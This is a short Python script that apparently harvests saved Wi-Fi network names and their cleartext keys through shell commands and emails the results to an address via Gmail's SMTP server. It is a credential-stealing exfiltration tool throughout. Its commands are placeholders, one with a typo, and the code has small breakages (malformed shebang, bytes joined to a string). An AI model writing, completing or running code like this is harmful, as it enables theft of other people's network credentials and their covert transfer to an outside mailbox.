#!usr/bin/env python

import subprocess
import smtplib
import re

def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "command_to_execute"
check_networks = subprocess.check_output(command, shell=True)
show_network_names = re.findall("(?:Profile\s*:\s)(.*)", check_networks)

result = ""
for network_name in show_network_names:
    command = f"command_to execute {network_name} key=clear"
    get_result = subprocess.check_output(command, shell=True)
    result = result + get_result

send_email("youremail@ggmail.com", "your_password", result)

